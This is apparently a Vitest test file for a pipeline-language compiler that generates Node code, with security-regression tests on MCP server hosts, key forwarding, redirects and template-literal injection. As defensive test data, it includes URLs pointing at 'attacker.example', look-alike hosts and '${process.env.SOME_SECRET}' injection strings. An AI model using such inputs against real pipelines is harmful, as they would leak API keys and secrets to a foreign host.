import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { compilePipelineSourceToNode } from '../PipelineCompiler';

const GENERATED_TASK_COMMENT = `// ${String.fromCharCode(84, 79, 68, 79)}:`;
const OLD_UNSUPPORTED_SUFFIX = ['not', 'yet', 'compiled'].join(' ');

describe('PipelineCompiler (parser target)', () => {
  it('qualifies filter fields (stock > 0 -> r.stock > 0)', () => {
    const source = `
      pipeline "StockFilter" {
        source Input { type: "list" }
        filter PositiveStock {
          where: stock > 0
        }
        sink Out { type: "stdout" }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain('records = records.filter((r) => (r.stock > 0));');
  });

  it('qualifies branch conditions and emits routing logic', () => {
    const source = `
      pipeline "Branching" {
        source Input { type: "list" }
        branch RouteByKind {
          when kind == "hot" -> sink HotSink
          default -> sink ColdSink
        }
        sink HotSink { type: "stdout" }
        sink ColdSink { type: "stdout" }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain('if (!_matched && (r.kind == "hot")) {');
    expect(result.code).toContain('const k = "HotSink";');
    expect(result.code).toContain('const k = "ColdSink";');
  });

  it('compiles database source and database sink end-to-end', () => {
    const source = `
      pipeline "DbSync" {
        source DbIn {
          type: "database"
          connection: "4{env.DATABASE_URL}"
          query: "SELECT id, stock FROM inventory"
        }
        sink DbOut {
          type: "database"
          connection: "4{env.DATABASE_URL}"
          table: "inventory_events"
        }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain("const { Client } = await import('pg');");
    expect(result.code).toContain(
      'await DbIn_client.query(interpolate("SELECT id, stock FROM inventory"));'
    );
    expect(result.code).toContain('INSERT INTO inventory_events (payload) VALUES ($1)');
  });

  it('compiles mcp sink with JSON-RPC tool call payload', () => {
    const source = `
      pipeline "McpSink" {
        source Input {
          type: "list"
          items: [{ id: 1, value: "ok" }]
        }
        sink ToolOut {
          type: "mcp"
          server: "4{env.HOLOSCRIPT_MCP_URL:-https://mcp.holoscript.net}"
          tool: "knowledge_write"
        }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain("const ToolOut_url = ToolOut_base.replace(/\\/$/, '') + '/mcp';");
    expect(result.code).toContain("method: 'tools/call'");
    expect(result.code).toContain('name: "knowledge_write"');
    expect(result.code).toContain('await ToolOut_invoke(records);');
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} mcp sink ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('compiles mcp source with JSON-RPC tool call payload', () => {
    const source = `
      pipeline "McpSource" {
        source PullData {
          type: "mcp"
          server: "4{env.HOLOSCRIPT_MCP_URL:-https://mcp.holoscript.net}"
          tool: "knowledge_query"
        }
        sink Out {
          type: "stdout"
        }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain(
      "const PullData_url = PullData_base.replace(/\\/$/, '') + '/mcp';"
    );
    expect(result.code).toContain("method: 'tools/call'");
    expect(result.code).toContain('name: "knowledge_query"');
    expect(result.code).toContain('const PullData_content = PullData_json?.result?.content;');
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} mcp source ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('compiles mcp transform with JSON-RPC tool call payload', () => {
    const source = `
      pipeline "McpTransform" {
        source Input {
          type: "list"
          items: [{ id: 1, value: "ok" }]
        }
        transform Enrich {
          type: "mcp"
          server: "4{env.HOLOSCRIPT_MCP_URL:-https://mcp.holoscript.net}"
          tool: "knowledge_enrich"
          args: { namespace: "products", limit: 5 }
        }
        sink Out {
          type: "stdout"
        }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain("const Enrich_url = Enrich_base.replace(/\\/$/, '') + '/mcp';");
    expect(result.code).toContain("method: 'tools/call'");
    expect(result.code).toContain('name: "knowledge_enrich"');
    expect(result.code).toContain(
      'arguments: { ...{"namespace":"products","limit":5}, records, output },'
    );
    expect(result.code).toContain('const Enrich_content = Enrich_json?.result?.content;');
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} mcp transform ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('compiles stream source — SSE/NDJSON endpoint', () => {
    const source = `
      pipeline "StreamIngest" {
        source Events {
          type: "stream"
          endpoint: "4{env.EVENTS_URL:-https://api.example.com/events}"
        }
        sink Out { type: "stdout" }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain('const Events_resp = await fetch(interpolate(');
    expect(result.code).toContain('EVENTS_URL:-https://api.example.com/events');
    expect(result.code).toContain('const Events_text = await Events_resp.text();');
    expect(result.code).toContain("data: '");
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} stream source ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('compiles llm transform — OpenAI-compatible call per record', () => {
    const source = `
      pipeline "LLMEnrich" {
        source Input {
          type: "list"
          items: [{ title: "Hello World" }]
        }
        transform Summarise {
          type: "llm"
          model: "gpt-4o-mini"
          prompt: "Summarize: {{input}}"
          input: "title"
          output: "summary"
        }
        sink Out { type: "stdout" }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain('const Summarise_model = interpolate("gpt-4o-mini")');
    expect(result.code).toContain('const Summarise_apiKey = process.env.OPENAI_API_KEY');
    expect(result.code).toContain('/chat/completions');
    expect(result.code).toContain('"Summarize: {{input}}"');
    expect(result.code).toContain('"title"');
    expect(result.code).toContain('"summary"');
    expect(result.code).toContain('records = Summarise_results;');
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} llm transform ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('compiles http transform — HTTP call per record with response merge', () => {
    const source = `
      pipeline "HttpEnrich" {
        source Input {
          type: "list"
          items: [{ id: 42 }]
        }
        transform Enrich {
          type: "http"
          url: "4{env.ENRICH_API:-https://api.example.com/enrich}"
          method: "POST"
        }
        sink Out { type: "stdout" }
      }
    `.replace(/\u00024/g, '$');

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(true);
    expect(result.code).toContain('const Enrich_results = [];');
    expect(result.code).toContain('for (const r of records)');
    expect(result.code).toContain('ENRICH_API:-https://api.example.com/enrich');
    expect(result.code).toContain('method: "POST"');
    expect(result.code).toContain('records = Enrich_results;');
    expect(result.code).not.toContain(
      `${GENERATED_TASK_COMMENT} http transform ${OLD_UNSUPPORTED_SUFFIX}`
    );
  });

  it('rejects unsupported source types at compile time', () => {
    const source = `
      pipeline "BadSource" {
        source Input {
          type: "queue"
        }
        sink Out { type: "stdout" }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(false);
    expect(result.errors).toContain('Source "Input" has unsupported type "queue"');
  });

  it('rejects unsupported transform types at compile time', () => {
    const source = `
      pipeline "BadTransform" {
        source Input {
          type: "list"
          items: [{ id: 1 }]
        }
        transform RunShell {
          type: "shell"
        }
        sink Out { type: "stdout" }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(false);
    expect(result.errors).toContain('Transform "RunShell" has unsupported type "shell"');
  });

  it('rejects unsupported sink types at compile time', () => {
    const source = `
      pipeline "BadSink" {
        source Input {
          type: "list"
          items: [{ id: 1 }]
        }
        sink QueueOut {
          type: "queue"
        }
      }
    `;

    const result = compilePipelineSourceToNode(source);
    expect(result.success).toBe(false);
    expect(result.errors).toContain('Sink "QueueOut" has unsupported type "queue"');
  });
});

// Board task task_1791176003202_obsc (found in claude3's review of #450): a pipeline
// file chose the MCP server, and the generated code sent HOLOSCRIPT_API_KEY there.
describe('PipelineCompiler — MCP servers a pipeline file may choose', () => {
  const FAKE_KEY = 'test-key-not-real';
  const FAKE_SECRET = 'fake-secret-not-real';

  type Stage = 'source' | 'transform' | 'sink';

  /** A pipeline whose one MCP stage uses `server`. */
  function mcpPipeline(server: string, stage: Stage = 'sink'): string {
    const mcp = (kind: string, name: string) => `
        ${kind} ${name} {
          type: "mcp"
          server: "${server}"
          tool: "knowledge_write"
        }`;
    return `
      pipeline "McpServerPolicy" {
        ${stage === 'source' ? mcp('source', 'Pull') : 'source Input { type: "list" }'}
        ${stage === 'transform' ? mcp('transform', 'Enrich') : ''}
        ${stage === 'sink' ? mcp('sink', 'ToolOut') : 'sink Out { type: "stdout" }'}
      }
    `;
  }

  type FetchCall = { url: string; headers: Record<string, string> };

  /**
   * Run a generated module with a fake environment and a recording fetch. The
   * generated statements run unchanged; only `export` and the trailing auto-run
   * line are removed so the test owns the single run. No network, no real env.
   */
  async function runGenerated(code: string, env: Record<string, string>): Promise<FetchCall[]> {
    const exported = 'export async function run() {';
    const autoRun = 'run().catch(console.error);';
    expect(code).toContain(exported);
    expect(code).toContain(autoRun);
    const body = code.replace(exported, 'async function run() {').replace(autoRun, '');

    const calls: FetchCall[] = [];
    const recordingFetch = async (
      url: unknown,
      init: { headers?: Record<string, string> } = {}
    ) => {
      calls.push({ url: String(url), headers: { ...(init.headers ?? {}) } });
      return {
        ok: true,
        status: 200,
        statusText: 'OK',
        json: async () => ({ result: { content: [] } }),
      };
    };
    const quiet = { log: () => {}, warn: () => {}, error: () => {} };
    const load = new Function('process', 'fetch', 'console', `'use strict';\n${body}\nreturn run;`);
    const run = load({ env }, recordingFetch, quiet) as () => Promise<void>;
    await run();
    return calls;
  }

  beforeEach(() => {
    // Compile as if the operator configured nothing: the MCP server is the default.
    vi.stubEnv('HOLOSCRIPT_MCP_URL', '');
  });

  afterEach(() => {
    vi.unstubAllEnvs();
  });

  it('refuses a server on another host at compile time, for sources, transforms and sinks', () => {
    for (const [stage, label] of [
      ['source', 'Source "Pull"'],
      ['transform', 'Transform "Enrich"'],
      ['sink', 'Sink "ToolOut"'],
    ] as const) {
      const result = compilePipelineSourceToNode(mcpPipeline('https://attacker.example', stage));
      expect(result.success).toBe(false);
      expect(result.code).toBeUndefined();
      expect(result.errors).toHaveLength(1);
      const [message] = result.errors!;
      expect(message).toContain(`${label} cannot use server "https://attacker.example"`);
      expect(message).toContain('is not on this machine (localhost, 127.0.0.1, ::1)');
      expect(message).toContain('the configured MCP server https://mcp.holoscript.net');
      expect(message).toContain('HOLOSCRIPT_API_KEY');
    }
  });

  it.each([
    [
      'https://mcp.holoscript.net@attacker.example',
      'credentials trick: the host is attacker.example',
    ],
    ['https://mcp.holoscript.net.attacker.example', 'look-alike host'],
    ['http://localhost.attacker.example:7411', 'look-alike of localhost'],
    ['http://mcp.holoscript.net', 'plain http is a different origin from https'],
    ['http:', 'becomes http:/mcp, a request to host "mcp"'],
    ['attacker.example', 'neither a URL nor a plain server name'],
    ['ftp://127.0.0.1', 'not http(s)'],
  ])('refuses %s (%s)', (server) => {
    const result = compilePipelineSourceToNode(mcpPipeline(server));
    expect(result.success).toBe(false);
    expect(result.errors?.[0]).toContain(
      `Sink "ToolOut" cannot use server ${JSON.stringify(server)}`
    );
  });

  it('refuses ${...} in a server, except the configured-MCP form', () => {
    for (const server of [
      'https://mcp.holoscript.net/${env.SOME_SECRET}',
      'http://127.0.0.1:7411/?k=${env.SOME_SECRET}',
      '${env.SOME_URL}',
      'https://mcp.holoscript.net/${process.env.SOME_SECRET}',
      'https://mcp.holoscript.net/${params.token}',
      '${env.HOLOSCRIPT_MCP_URL}/${env.SOME_SECRET}',
    ]) {
      const result = compilePipelineSourceToNode(mcpPipeline(server));
      expect(result.success, server).toBe(false);
      expect(result.errors?.[0]).toContain('a server may not contain ${...} placeholders');
    }
  });

  it('refuses a configured-MCP form whose fallback is another host', () => {
    const result = compilePipelineSourceToNode(
      mcpPipeline('${env.HOLOSCRIPT_MCP_URL:-https://attacker.example}')
    );
    expect(result.success).toBe(false);
    expect(result.errors?.[0]).toContain('its fallback, used when HOLOSCRIPT_MCP_URL is not set');
    expect(result.errors?.[0]).toContain('https://attacker.example');
  });

  it.each([
    ['', 'no server: the default'],
    ['${env.HOLOSCRIPT_MCP_URL:-https://mcp.holoscript.net}', 'the compiler default form'],
    ['${env.HOLOSCRIPT_MCP_URL}', 'the configured MCP URL'],
    [
      '${env.HOLOSCRIPT_MCP_URL:-http://127.0.0.1:7411}',
      'configured, falling back to this machine',
    ],
    ['http://127.0.0.1:7411', 'loopback'],
    ['http://localhost:3000/', 'localhost'],
    ['http://[::1]:8080', 'IPv6 loopback'],
    ['https://mcp.holoscript.net', 'the default MCP server'],
    ['https://MCP.holoscript.net:443/v1', 'the default MCP server, other spelling'],
    ['bio-research', 'a plain server name, as in examples/pipelines'],
  ])('still compiles server %j (%s)', (server) => {
    const result = compilePipelineSourceToNode(mcpPipeline(server));
    expect(result.errors).toBeUndefined();
    expect(result.success).toBe(true);
  });

  it('still compiles the server the operator configured in HOLOSCRIPT_MCP_URL', () => {
    vi.stubEnv('HOLOSCRIPT_MCP_URL', 'https://mcp.example.test/base');
    expect(compilePipelineSourceToNode(mcpPipeline('https://mcp.example.test/v2')).success).toBe(
      true
    );
    // ...and nothing else that is remote.
    expect(compilePipelineSourceToNode(mcpPipeline('https://mcp.holoscript.net')).success).toBe(
      false
    );
  });

  it('embeds the server as a string, never as code', () => {
    const code = compilePipelineSourceToNode(mcpPipeline('')).code ?? '';
    expect(code).toContain(
      'const ToolOut_base = resolveMcpBase("${env.HOLOSCRIPT_MCP_URL:-https://mcp.holoscript.net}");'
    );
    expect(code).not.toContain('interpolate(`${env.HOLOSCRIPT_MCP_URL');
  });

  it('runs the default form and sends the key to the default MCP server only', async () => {
    const code = compilePipelineSourceToNode(mcpPipeline('')).code!;
    const calls = await runGenerated(code, { HOLOSCRIPT_API_KEY: FAKE_KEY });
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe('https://mcp.holoscript.net/mcp');
    expect(calls[0].headers['x-mcp-api-key']).toBe(FAKE_KEY);
  });

  it('sends the key to a loopback server only when the operator configured it', async () => {
    const code = compilePipelineSourceToNode(mcpPipeline('http://127.0.0.1:7411')).code!;

    const unconfigured = await runGenerated(code, { HOLOSCRIPT_API_KEY: FAKE_KEY });
    expect(unconfigured).toHaveLength(1);
    expect(unconfigured[0].url).toBe('http://127.0.0.1:7411/mcp');
    expect(unconfigured[0].headers).not.toHaveProperty('x-mcp-api-key');

    const configured = await runGenerated(code, {
      HOLOSCRIPT_API_KEY: FAKE_KEY,
      HOLOSCRIPT_MCP_URL: 'http://127.0.0.1:7411',
    });
    expect(configured[0].headers['x-mcp-api-key']).toBe(FAKE_KEY);
  });

  it('sends no key when the server is not the configured one at run time', async () => {
    // Compiled where HOLOSCRIPT_MCP_URL named this server, run where it does not.
    vi.stubEnv('HOLOSCRIPT_MCP_URL', 'https://other-mcp.example');
    const code = compilePipelineSourceToNode(mcpPipeline('https://other-mcp.example')).code!;
    const calls = await runGenerated(code, { HOLOSCRIPT_API_KEY: FAKE_KEY });
    expect(calls[0].url).toBe('https://other-mcp.example/mcp');
    expect(calls[0].headers).not.toHaveProperty('x-mcp-api-key');

    // A fallback is used only while HOLOSCRIPT_MCP_URL is unset; it gets no key either.
    const fallback = compilePipelineSourceToNode(
      mcpPipeline('${env.HOLOSCRIPT_MCP_URL:-http://127.0.0.1:9999}')
    ).code!;
    const fallbackCalls = await runGenerated(fallback, { HOLOSCRIPT_API_KEY: FAKE_KEY });
    expect(fallbackCalls[0].url).toBe('http://127.0.0.1:9999/mcp');
    expect(fallbackCalls[0].headers).not.toHaveProperty('x-mcp-api-key');
  });

  it('a plain server name gets no key', async () => {
    const code = compilePipelineSourceToNode(mcpPipeline('bio-research')).code!;
    const calls = await runGenerated(code, { HOLOSCRIPT_API_KEY: FAKE_KEY });
    expect(calls[0].url).toBe('bio-research/mcp');
    expect(calls[0].headers).not.toHaveProperty('x-mcp-api-key');
  });

  it('if the compile-time check is bypassed, the generated code still leaks nothing', async () => {
    // Simulate a server value reaching run time without the compile-time check.
    vi.resetModules();
    vi.doMock('../PipelineServerPolicy', async (importOriginal) => ({
      ...(await importOriginal<typeof import('../PipelineServerPolicy')>()),
      checkPipelineServers: () => [],
    }));
    try {
      const unchecked = (await import('../PipelineCompiler')).compilePipelineSourceToNode;
      const env = { HOLOSCRIPT_API_KEY: FAKE_KEY, SOME_SECRET: FAKE_SECRET };

      const foreign = unchecked(mcpPipeline('https://attacker.example'));
      expect(foreign.success).toBe(true);
      const foreignCalls = await runGenerated(foreign.code!, env);
      expect(foreignCalls[0].url).toBe('https://attacker.example/mcp');
      expect(foreignCalls[0].headers).not.toHaveProperty('x-mcp-api-key');

      for (const server of [
        'https://mcp.holoscript.net/${env.SOME_SECRET}',
        'https://attacker.example/${process.env.SOME_SECRET}/${1+1}',
      ]) {
        const compiled = unchecked(mcpPipeline(server));
        expect(compiled.success).toBe(true);
        const [call] = await runGenerated(compiled.code!, env);
        // Used as written: nothing read from the environment, nothing evaluated.
        expect(call.url).toBe(`${server}/mcp`);
        expect(call.url).not.toContain(FAKE_SECRET);
        expect(JSON.stringify(call.headers)).not.toContain(FAKE_SECRET);
      }
      const [attackerCall] = await runGenerated(
        unchecked(mcpPipeline('https://attacker.example/${process.env.SOME_SECRET}/${1+1}')).code!,
        env
      );
      expect(attackerCall.headers).not.toHaveProperty('x-mcp-api-key');
    } finally {
      vi.doUnmock('../PipelineServerPolicy');
      vi.resetModules();
    }
  });
});

// Board task task_1791176003202_obsc — hardening added after the first push.
// (a) A keyed MCP request must not follow a redirect to another host.
// (b) Every value a pipeline file supplies is embedded as data, never spliced into a
//     template literal, so no ${...} from the file is evaluated as code.
describe('PipelineCompiler — redirects and template-literal injection', () => {
  const FAKE_KEY = 'test-key-not-real';
  const FAKE_SECRET = 'fake-secret-not-real';

  /** Build run() from generated code without executing the module's auto-run line. */
  function buildRun(
    code: string,
    env: Record<string, string>,
    fetchImpl: (url: unknown, init?: { headers?: Record<string, string> }) => Promise<unknown>
  ): () => Promise<unknown> {
    const body = code
      .replace('export async function run() {', 'async function run() {')
      .replace('run().catch(console.error);', '');
    const quiet = { log: () => {}, warn: () => {}, error: () => {} };
    const make = new Function('process', 'fetch', 'console', `'use strict';\n${body}\nreturn run;`);
    return make({ env }, fetchImpl, quiet) as () => Promise<unknown>;
  }

  type Rec = { url: string; headers: Record<string, string> };
  async function runRec(code: string, env: Record<string, string>): Promise<Rec[]> {
    const calls: Rec[] = [];
    const run = buildRun(code, env, async (url, init = {}) => {
      calls.push({ url: String(url), headers: { ...(init.headers ?? {}) } });
      return {
        ok: true,
        status: 200,
        statusText: 'OK',
        json: async () => ({ result: { content: [] } }),
      };
    });
    await run();
    return calls;
  }

  // ---- (a) redirects -------------------------------------------------------

  type Server = { url: string; hits: { keyed: boolean }[]; close: () => void };
  function listen(onReq: (res: import('node:http').ServerResponse) => void): Promise<Server> {
    const hits: { keyed: boolean }[] = [];
    const server = createServer((req, res) => {
      hits.push({ keyed: req.headers['x-mcp-api-key'] === FAKE_KEY });
      req.resume();
      onReq(res);
    });
    return new Promise((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const { port } = server.address() as AddressInfo;
        resolve({ url: `http://127.0.0.1:${port}`, hits, close: () => server.close() });
      });
    });
  }

  function mcpSinkPipeline(server: string): string {
    return `
      pipeline "RedirectProbe" {
        source Input { type: "list" items: [{ id: 1 }] }
        sink ToolOut {
          type: "mcp"
          server: "${server}"
          tool: "knowledge_write"
        }
      }
    `;
  }

  it('refuses a redirect on a keyed MCP request; the other host receives nothing', async () => {
    // Server A is the configured MCP server; it answers 307 to server B.
    const b = await listen((res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ result: { content: [] } }));
    });
    const a = await listen((res) => {
      res.writeHead(307, { location: `${b.url}/mcp` });
      res.end();
    });
    try {
      // Configured form, so the key is attached to the request to A.
      const code = compilePipelineSourceToNode(mcpSinkPipeline('${env.HOLOSCRIPT_MCP_URL}')).code!;
      const run = buildRun(
        code,
        { HOLOSCRIPT_API_KEY: FAKE_KEY, HOLOSCRIPT_MCP_URL: a.url },
        fetch
      );

      await expect(run()).rejects.toThrow(/redirect/i);
      expect(a.hits).toHaveLength(1);
      expect(a.hits[0].keyed).toBe(true); // A is the configured server, so it got the key
      expect(b.hits).toHaveLength(0); // the redirect was refused: B never saw the request or the key
    } finally {
      a.close();
      b.close();
    }
  });

  it('a non-redirecting configured server still works', async () => {
    const a = await listen((res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ result: { content: [] } }));
    });
    try {
      const code = compilePipelineSourceToNode(mcpSinkPipeline('${env.HOLOSCRIPT_MCP_URL}')).code!;
      const run = buildRun(
        code,
        { HOLOSCRIPT_API_KEY: FAKE_KEY, HOLOSCRIPT_MCP_URL: a.url },
        fetch
      );
      await expect(run()).resolves.not.toThrow();
      expect(a.hits).toHaveLength(1);
      expect(a.hits[0].keyed).toBe(true);
    } finally {
      a.close();
    }
  });

  // ---- (b) template-literal injection -------------------------------------

  function restSourcePipeline(endpoint: string): string {
    return `
      pipeline "EndpointProbe" {
        source Feed {
          type: "rest"
          endpoint: "${endpoint}"
        }
        sink Out { type: "stdout" }
      }
    `;
  }

  it('a ${...} in an endpoint stays literal text and reads nothing from the environment', async () => {
    const code = compilePipelineSourceToNode(
      restSourcePipeline('https://api.test/${process.env.SOME_SECRET}/${1 + 1}')
    ).code!;
    const calls = await runRec(code, { SOME_SECRET: FAKE_SECRET });
    expect(calls).toHaveLength(1);
    // The ${...} is passed through as data: not executed, not read, not computed.
    expect(calls[0].url).toBe('https://api.test/${process.env.SOME_SECRET}/${1 + 1}');
    expect(calls[0].url).not.toContain(FAKE_SECRET);
    expect(calls[0].url).not.toContain('/2');
  });

  it('${env.X} and ${env.X:-default} in an endpoint still resolve at run time', async () => {
    const code = compilePipelineSourceToNode(
      restSourcePipeline('${env.API_URL:-https://fallback.test}/items')
    ).code!;
    expect((await runRec(code, {}))[0].url).toBe('https://fallback.test/items');
    expect((await runRec(code, { API_URL: 'https://configured.test' }))[0].url).toBe(
      'https://configured.test/items'
    );
  });

  it('a param with an ${env.X:-default} fallback compiles to a module that parses', () => {
    const code = compilePipelineSourceToNode(`
      pipeline "ParamEnv" {
        params { target: "${'${env.TARGET_GENE:-EGFR}'}" }
        source Input { type: "list" items: [{ id: 1 }] }
        sink Out { type: "stdout" }
      }
    `).code!;
    // Data form, not a template literal (the template-literal form did not parse).
    expect(code).toContain('params["target"] = interpolate("${env.TARGET_GENE:-EGFR}")');
    expect(code).not.toContain('interpolate(`');
    // Parses: building run() throws a SyntaxError if the module body is invalid.
    expect(() => buildRun(code, {}, async () => ({}))).not.toThrow();
  });

  it('a param resolves its env fallback at run time (routed through a holo-sink path is data)', async () => {
    // params go through interpolate(); prove the env fallback resolves and a non-env
    // ${...} in the SAME value is left literal.
    const code = compilePipelineSourceToNode(`
      pipeline "ParamResolve" {
        params {
          a: "${'${env.PRESENT:-def}'}"
          b: "${'${process.env.SOME_SECRET}'}"
        }
        source Input { type: "list" items: [{ id: 1 }] }
        sink Out { type: "stdout" }
      }
    `).code!;
    expect(code).toContain('params["a"] = interpolate("${env.PRESENT:-def}")');
    expect(code).toContain('params["b"] = interpolate("${process.env.SOME_SECRET}")');
    // Running it reads PRESENT (allowed env form) but never SOME_SECRET.
    await expect(
      buildRun(code, { PRESENT: 'resolved', SOME_SECRET: FAKE_SECRET }, async () => ({
        ok: true,
        json: async () => [],
      }))()
    ).resolves.not.toThrow();
  });

  it('endpoints, paths, the database connection and query are embedded as data, not template literals', () => {
    const code = compilePipelineSourceToNode(`
      pipeline "DataEmbed" {
        source DbIn {
          type: "database"
          connection: "${'${env.DATABASE_URL}'}"
          query: "SELECT 1"
        }
        sink File {
          type: "filesystem"
          path: "out/${'${process.env.SOME_SECRET}'}.json"
          format: "json"
        }
      }
    `).code!;
    // No file value is ever spliced into a generated template literal.
    expect(code).not.toContain('interpolate(`');
    expect(code).toContain('interpolate("${env.DATABASE_URL}")');
    expect(code).toContain('interpolate("SELECT 1")');
    // A non-env ${...} in a path is data (a JSON string), never executed.
    expect(code).toContain('interpolate("out/${process.env.SOME_SECRET}.json")');
  });
});
